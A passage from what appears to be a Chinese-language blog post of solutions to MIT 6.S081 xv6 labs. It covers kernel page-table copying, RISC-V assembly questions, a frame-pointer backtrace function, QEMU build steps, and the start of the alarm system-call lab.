np-&gt;trapframe-&gt;a0 = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">// increment reference counts on open file descriptors.</span><br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; NOFILE; i++)<br>    <span class="hljs-keyword">if</span>(p-&gt;ofile[i])<br>      np-&gt;ofile[i] = filedup(p-&gt;ofile[i]);<br>  np-&gt;cwd = idup(p-&gt;cwd);<br>  u2kvmcopy(np-&gt;pagetable, np-&gt;kpgtable, <span class="hljs-number">0</span>, np-&gt;sz);<br>  safestrcpy(np-&gt;name, p-&gt;name, <span class="hljs-keyword">sizeof</span>(p-&gt;name));<br><br>  pid = np-&gt;pid;<br><br>  np-&gt;state = RUNNABLE;<br><br>  release(&amp;np-&gt;lock);<br><br>  <span class="hljs-keyword">return</span> pid;<br>&#125;<br></code></pre></td></tr></table></figure><p>在exec函数加上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">u2kvmcopy(np-&gt;pagetable, np-&gt;kpgtable, <span class="hljs-number">0</span>, np-&gt;sz);<br>  <span class="hljs-comment">// Push argument strings, prepare rest of stack in ustack.</span><br>  <span class="hljs-keyword">for</span>(argc = <span class="hljs-number">0</span>; argv[argc]; argc++) &#123;<br>    <span class="hljs-keyword">if</span>(argc &gt;= MAXARG)<br>      <span class="hljs-keyword">goto</span> bad;<br>    sp -= <span class="hljs-built_in">strlen</span>(argv[argc]) + <span class="hljs-number">1</span>;<br>    sp -= sp % <span class="hljs-number">16</span>; <span class="hljs-comment">// riscv sp must be 16-byte aligned</span><br>    <span class="hljs-keyword">if</span>(sp &lt; stackbase)<br>      <span class="hljs-keyword">goto</span> bad;<br>    <span class="hljs-keyword">if</span>(copyout(pagetable, sp, argv[argc], <span class="hljs-built_in">strlen</span>(argv[argc]) + <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>      <span class="hljs-keyword">goto</span> bad;<br>    ustack[argc] = sp;<br>  &#125;<br></code></pre></td></tr></table></figure><p>growproc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Grow or shrink user memory by n bytes.</span><br><span class="hljs-comment">// Return 0 on success, -1 on failure.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">growproc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>  uint sz;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br><br>  sz = p-&gt;sz;<br>  <span class="hljs-keyword">if</span>(n &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">if</span>((sz = uvmalloc(p-&gt;pagetable, sz, sz + n)) == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    u2kvmcopy(p-&gt;pagetable, p-&gt;kpgtable, sz-n, sz);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n &lt; <span class="hljs-number">0</span>)&#123;<br>    sz = uvmdealloc(p-&gt;pagetable, sz, sz + n);<br>  &#125;<br>  p-&gt;sz = sz;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image-20230520212417687.png"></p><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.csdn.net/rocketeerLi/article/details/121524760">https://blog.csdn.net/rocketeerLi/article/details/121524760</a></li><li><a href="https://fanxiao.tech/posts/2021-03-02-mit-6s081-notes/#38-lab-3-pgtbl">https://fanxiao.tech/posts/2021-03-02-mit-6s081-notes/#38-lab-3-pgtbl</a></li></ul><h1 id="Lab4-trap"><a href="#Lab4-trap" class="headerlink" title="Lab4 trap"></a>Lab4 trap</h1><h2 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h2><ul><li><p>看完<a href="https://www.bilibili.com/video/BV19k4y1C7kA">p4、p5</a></p></li><li><p>搞清楚<a href="https://pdos.csail.mit.edu/6.S081/2020/labs/traps.html">lab要求</a></p></li><li><p>对riscv指令集、函数调用约定、trap机制有一定理解</p></li></ul><h2 id="RISC-V-assembly-easy"><a href="#RISC-V-assembly-easy" class="headerlink" title="RISC-V assembly (easy)"></a>RISC-V assembly (<a href="https://pdos.csail.mit.edu/6.S081/2020/labs/guidance.html">easy</a>)</h2><p>通过make fs.img 命令可以将user/call.c文件转化为user/call.asm文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/param.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">g</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> x+<span class="hljs-number">3</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> g(x);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d\n&quot;</span>, f(<span class="hljs-number">8</span>)+<span class="hljs-number">1</span>, <span class="hljs-number">13</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>不难观察出：</p><ol><li><code>s0</code>寄存器（也称为<code>fp</code>或帧指针）：它用于保存当前函数的帧指针，即指向当前函数栈帧的基址。在函数调用过程中，<code>s0</code>寄存器通常被用于存储上一个函数的栈帧基址，以便在函数返回时恢复调用者的栈帧。</li><li><code>sp</code>寄存器（也称为堆栈指针）：它用于指示当前的栈顶位置，即栈指针。栈是一种后进先出（LIFO）的数据结构，用于存储局部变量、函数调用信息和其他临时数据。在函数调用期间，栈会动态增长和收缩，而<code>sp</code>寄存器会随着栈的变化而移动。</li><li>a0保存第一个参数，同时具有存储返回值的用途（也即是x，返回x+3）。a1存储第二个参数，以此类推</li><li>f函数被内联优化，没有新开辟栈帧，它的内容和g函数相同</li><li>ra寄存器存储函数的返回地址</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs asm">user/_call:     file format elf64-littleriscv<br><br><br>Disassembly of section .text:<br><br>0000000000000000 &lt;g&gt;:<br>#include &quot;kernel/param.h&quot;<br>#include &quot;kernel/types.h&quot;<br>#include &quot;kernel/stat.h&quot;<br>#include &quot;user/user.h&quot;<br><br>int g(int x) &#123;<br>   0:1141                addisp,sp,-16 #给栈指针分配内存<br>   2:e422                sds0,8(sp) #保存s0寄存器的值<br>   4:0800                addis0,sp,16 <br>  return x+3;<br>&#125;<br>   6:250d                addiwa0,a0,3 # a0是第一个参数，也即是x，返回x+3<br>   8:6422                lds0,8(sp)<br>   a:0141                addisp,sp,16<br>   c:8082                ret<br><br>000000000000000e &lt;f&gt;:<br>#f函数被内联优化，没有新开辟栈帧，它的内容和g函数相同<br>int f(int x) &#123;<br>   e:1141                addisp,sp,-16<br>  10:e422                sds0,8(sp)<br>  12:0800                addis0,sp,16<br>  return g(x);<br>&#125;<br>  14:250d                addiwa0,a0,3<br>  16:6422                lds0,8(sp)<br>  18:0141                addisp,sp,16<br>  1a:8082                ret<br><br>000000000000001c &lt;main&gt;:<br><br>void main(void) &#123;<br>  1c:1141                addisp,sp,-16 # 初始化工作<br>  1e:e406                sdra,8(sp)<br>  20:e022                sds0,0(sp)<br>  22:0800                addis0,sp,16<br>  printf(&quot;%d %d\n&quot;, f(8)+1, 13);<br>  24:4635                lia2,13<br>  26:45b1                lia1,12 # f(8)+1<br>  28:00000517          auipca0,0x0<br>  2c:79050513          addia0,a0,1936 # 7b8 &lt;malloc+0xea&gt;<br>  30:00000097          auipcra,0x0<br>  34:5e6080e7          jalr1510(ra) # 616 &lt;printf&gt;<br>  exit(0);<br>  38:4501                lia0,0<br>  3a:00000097          auipcra,0x0<br>  3e:274080e7          jalr628(ra) # 2ae &lt;exit&gt;<br><br></code></pre></td></tr></table></figure><h2 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h2><p>Which registers contain arguments to functions? For example, which register holds 13 in main’s call to <code>printf</code>?</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">reg    |<span class="hljs-string"> name  </span>|<span class="hljs-string"> saver  </span>|<span class="hljs-string"> description</span><br><span class="hljs-string">-------+-------+--------+------------</span><br><span class="hljs-string">x0     </span>|<span class="hljs-string"> zero  </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> hardwired zero</span><br><span class="hljs-string">x1     </span>|<span class="hljs-string"> ra    </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> return address</span><br><span class="hljs-string">x2     </span>|<span class="hljs-string"> sp    </span>|<span class="hljs-string"> callee </span>|<span class="hljs-string"> stack pointer</span><br><span class="hljs-string">x3     </span>|<span class="hljs-string"> gp    </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> global pointer</span><br><span class="hljs-string">x4     </span>|<span class="hljs-string"> tp    </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> thread pointer</span><br><span class="hljs-string">x5-7   </span>|<span class="hljs-string"> t0-2  </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> temporary registers</span><br><span class="hljs-string">x8     </span>|<span class="hljs-string"> s0/fp </span>|<span class="hljs-string"> callee </span>|<span class="hljs-string"> saved register / frame pointer</span><br><span class="hljs-string">x9     </span>|<span class="hljs-string"> s1    </span>|<span class="hljs-string"> callee </span>|<span class="hljs-string"> saved register</span><br><span class="hljs-string">x10-11 </span>|<span class="hljs-string"> a0-1  </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> function arguments / return values</span><br><span class="hljs-string">x12-17 </span>|<span class="hljs-string"> a2-7  </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> function arguments</span><br><span class="hljs-string">x18-27 </span>|<span class="hljs-string"> s2-11 </span>|<span class="hljs-string"> callee </span>|<span class="hljs-string"> saved registers</span><br><span class="hljs-string">x28-31 </span>|<span class="hljs-string"> t3-6  </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> temporary registers</span><br><span class="hljs-string">pc     </span>|<span class="hljs-string">       </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> program counter</span><br></code></pre></td></tr></table></figure><p>a0保存第一个参数，同时具有存储返回值的用途（也即是x，返回x+3）。a1存储第二个参数，以此类推</p><h2 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h2><p>Where is the call to function <code>f</code> in the assembly code for main? Where is the call to <code>g</code>? (Hint: the compiler may inline functions.)</p><p>代码<code>li    a1,12 </code>直接将f(8)+1的结果存入a1中，并没有调用函数的过程，这里存在编译器的优化</p><h2 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h2><p>At what address is the function <code>printf</code> located?</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">0000000000000616</span> &lt;printf&gt;:<br><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *fmt, ...)</span></span><br><span class="hljs-function"></span>&#123;<br> <span class="hljs-number">616</span>:<span class="hljs-number">711</span>d                addisp,sp,<span class="hljs-number">-96</span><br></code></pre></td></tr></table></figure><p>616</p><blockquote><p><code>jalr 1510(ra)</code>指令用于调用<code>printf</code>函数，其中偏移量1510是相对于全局地址0x0<strong>的偏移</strong>。（全局地址不确定）</p></blockquote><h2 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h2><p>Run the following code.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">unsigned</span> int i = <span class="hljs-number">0</span>x<span class="hljs-number">00646</span>c<span class="hljs-number">72</span>;<br><span class="hljs-attribute">printf</span>(<span class="hljs-string">&quot;H%x Wo%s&quot;</span>, <span class="hljs-number">57616</span>, &amp;i);<br>    <br></code></pre></td></tr></table></figure><p>What is the output? <a href="http://web.cs.mun.ca/~michael/c/ascii-table.html">Here’s an ASCII table</a> that maps bytes to characters.</p><p>The output depends on that fact that the RISC-V is little-endian. If the RISC-V were instead big-endian what would you set <code>i</code> to in order to yield the same output? Would you need to change <code>57616</code> to a different value?</p><p><a href="http://www.webopedia.com/TERM/b/big_endian.html">Here’s a description of little- and big-endian</a> and <a href="http://www.networksorcery.com/enp/ien/ien137.txt">a more whimsical description</a>.</p><p>57616是0xE110</p><p>%s打印出&amp;i指向十六进制数对应的ASCII码，遇0停止打印。变量<code>i</code>存储了字符串”rld\0”</p><p>最终打印出HE110 World</p><h2 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h2><p>In the following code, what is going to be printed after <code>&#39;y=&#39;</code>? (note: the answer is not a specific value.) Why does this happen?</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;x=%d y=%d&quot;</span>, <span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><p>y=a2寄存器的值</p><p>这里printf函数相当于有三个参数，第一个是字符串（a0保存），第二个是3（a1保存），第三个（（a2保存））</p><h2 id="Backtrace-moderate"><a href="#Backtrace-moderate" class="headerlink" title="Backtrace (moderate)"></a>Backtrace (<a href="https://pdos.csail.mit.edu/6.S081/2020/labs/guidance.html">moderate</a>)</h2><p>要求：<strong>在 kernel/printf.c 中实现一个 backtrace ()函数。在 sys _ sleep 中插入对此函数的调用，然后运行 bttest，它调用 sys _ sleep。你的输出应该如下:</strong></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">backtrace:</span><br><span class="hljs-number">0x000000080002cda</span><br><span class="hljs-number">0x000000080002bb6</span><br><span class="hljs-number">0x0000000080002898</span><br></code></pre></td></tr></table></figure><p>编译器在每个堆栈帧中放入一个包含调用者帧指针地址的帧指针。您的回溯应该使用这些帧指针来遍历堆栈，并在每个堆栈帧中打印保存的返回地址。</p><blockquote><p>补充一下基础知识：</p><p>栈指针：sp（stack pointer），指向栈的低地址</p><p>帧指针：fp（frame pointer），指向栈的高地址</p><p>fp-8：返回地址</p><p>fp-16：preview fp</p><p>内核会为栈分配一页的内存，因此可以使用 PGROUNDUP（fp）和 PGROUNDDOWN（fp）定位栈的上下边界，以终止循环</p></blockquote><p>具体的栈的内存布局参考lecture中教授手画图</p><ul><li><p>将backtrace的原型添加到 kernel/defs.h，这样就可以在 sys _ sleep 中调用backtrace</p><ul><li>在defs.h中添加<code>void backtrace(void);</code></li></ul></li><li><p>GCC 编译器将当前正在执行的函数的帧指针存储在寄存器 s0中。向 kernel/riscv.h 添加以下函数，并在backtrace中调用这个函数来读取当前帧指针。这个函数使用内联来读取 s0：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">static inline uint64<br>r_fp()<br>&#123;<br>  uint64 x;<br>  asm volatile(&quot;mv %0, s0&quot; : &quot;=r&quot; (x) );<br>  return x;<br>&#125;<br></code></pre></td></tr></table></figure><p>在printf.c文件中添加函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrace</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  uint64 fp=r_fp();<span class="hljs-comment">//get fp </span><br>  uint64 up_addr=PGROUNDUP(fp);<span class="hljs-comment">//up bound</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;backtrace:\n&quot;</span>);<span class="hljs-comment">//fmt output </span><br>  <span class="hljs-keyword">while</span>(fp&lt;up_addr)<br>  &#123;<br>    uint64 ret_addr=*(uint64 *)(fp<span class="hljs-number">-8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,ret_addr);<span class="hljs-comment">// attention that after %p is \n</span><br>    fp=*(uint64 *)(fp<span class="hljs-number">-16</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>bttest.c中如是写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  sleep(<span class="hljs-number">1</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>因此bttest作为测试文件会调用sleep，也即是sys_sleep。我们在sys_sleep中加入如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_sleep</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> n;<br>  uint ticks0;<br>  <span class="hljs-keyword">if</span>(argint(<span class="hljs-number">0</span>, &amp;n) &lt; <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  acquire(&amp;tickslock);<br>  ticks0 = ticks;<br>  <span class="hljs-keyword">while</span>(ticks - ticks0 &lt; n)&#123;<br>    <span class="hljs-keyword">if</span>(myproc()-&gt;killed)&#123;<br>      release(&amp;tickslock);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    sleep(&amp;ticks, &amp;tickslock);<br>  &#125;<br>  release(&amp;tickslock);<br>  backtrace();<span class="hljs-comment">// </span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样的话，sleep返回之前会调用backtrace函数</p><p>类似的，为了更好的debug，在panic函数中加入如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">panic</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span></span><br><span class="hljs-function"></span>&#123;<br>  pr.locking = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;panic: &quot;</span>);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  backtrace();<br>  panicked = <span class="hljs-number">1</span>; <span class="hljs-comment">// freeze uart output from other CPUs</span><br>  <span class="hljs-keyword">for</span>(;;)<br>    ;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样会在panic输出之后，打印出返回地址</p><blockquote><p>ps ：做到此处发现了的qemu卡死的问题，发现是2020版本lab的传统艺能。apt remove qemu*之后使用源码编译qemu5版本即可</p><p>Next, retrieve and extract the source for QEMU 5.1.0:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>wget <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/download.qemu.org/qemu</span><span class="hljs-number">-5.1</span>.0.tar.xz<br><span class="hljs-variable">$ </span>tar xf qemu<span class="hljs-number">-5.1</span>.0.tar.xz<br></code></pre></td></tr></table></figure><p>Build QEMU for riscv64-softmmu:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ <span class="hljs-keyword">cd</span> qemu-5.1.0<br>$ <span class="hljs-string">./configure</span> <span class="hljs-params">--disable-kvm</span> <span class="hljs-params">--disable-werror</span> <span class="hljs-params">--prefix=/usr/local</span> <span class="hljs-params">--target-list=</span><span class="hljs-string">&quot;riscv64-softmmu&quot;</span><br>$ make<br>$ sudo make install<br>$ <span class="hljs-keyword">cd</span> <span class="hljs-string">..</span><br></code></pre></td></tr></table></figure></blockquote><h2 id="Alarm-hard"><a href="#Alarm-hard" class="headerlink" title="Alarm (hard)"></a>Alarm (<a href="https://pdos.csail.mit.edu/6.S081/2020/labs/guidance.html">hard</a>)</h2><p>目标：</p><p>向 xv6添加一个特性，它将在进程使用 CPU 时间时<strong>周期性</strong>发出警报。更一般地说，实现用户级中断/错误处理程序的基本形式; 例如，可以使用类似的东西来处理应用程序中的页面错误。</p><p>hint：</p><ul><li>添加一个新的系统调用sigalarm(interval, handler)，如果应用程序调用 sigAlarm (n，fn) ，那么在程序消耗的每 n 个 CPU 时间之后，内核应该调用应用程序函数 fn。当 fn 返回时，应用程序应该从停止的地方恢复</li><li>如果一个应用程序调用 sigAlarm (0,0) ，内核应该停止生成周期性的alarm调用</li><li>user/alarmtest.c是测试文件，需要将其添加到makefile。添加了 sigAlarm 和 sigreturn 系统调用，它才能正确编译</li><li>可以在 user/alarmtest.asm 中看到 alarmtest 的汇编代码，这可能有助于调试</li><li>alarmtest 中在 test0 调用了 sigalarm(2, periodic)，要求内核强制每隔2个tick调用 period () ，然后spin一段时间</li></ul><p>test0：修改内核以跳转到用户空间中的警报处理程序</p><p>先修改makefile编译出alarmtest</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">UPROGS=\<br>$U/_cat\<br>$U/_echo\<br>$U/_forktest\<br>$U/_grep\<br>$U/_init\<br>$U/_kill\<br>$U/_ln\<br>$U/_ls\<br>$U/_mkdir\<br>$U/_rm\<br>$U/_sh\<br>$U/_stressfs\<br>$U/_usertests\<br>$U/_grind\<br>$U/_wc\<br>$U/_zombie\<br>$U/_alarmtest\<br></code></pre></td></tr></table></figure><p>放入 user/user.h 中的正确声明:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// system calls</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ticks, <span class="hljs-keyword">void</span> (*handler)())</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span 